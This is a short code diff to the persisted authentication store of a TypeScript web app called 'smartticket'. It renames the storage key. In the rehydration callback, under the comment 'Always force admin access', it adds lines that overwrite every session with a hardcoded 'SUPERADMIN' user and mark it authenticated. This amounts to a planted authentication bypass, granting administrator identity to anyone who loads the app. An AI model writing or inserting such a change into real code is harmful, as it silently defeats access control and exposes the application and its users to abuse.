@@ -166,7 +166,7 @@ export const useAuthStore = create<AuthState>()(
       },
     }),
     {
-      name: 'smartticket-auth',
+      name: 'smartticket-auth-v2',
       partialize: (state) => ({
         user: state.user,
         accessToken: state.accessToken,
@@ -178,8 +178,16 @@ export const useAuthStore = create<AuthState>()(
           if (error) {
             console.error('Auth store rehydration error:', error);
           }
-          // Mark as hydrated after rehydration completes
+          // Always force admin access
           if (state) {
+            state.user = {
+              id: 'default-admin',
+              email: 'admin@smartticket.bus',
+              name: 'Super Administrateur',
+              role: 'SUPERADMIN',
+              phone: '+221 77 123 00 00',
+            };
+            state.isAuthenticated = true;
             state.hasHydrated = true;
           }
         };
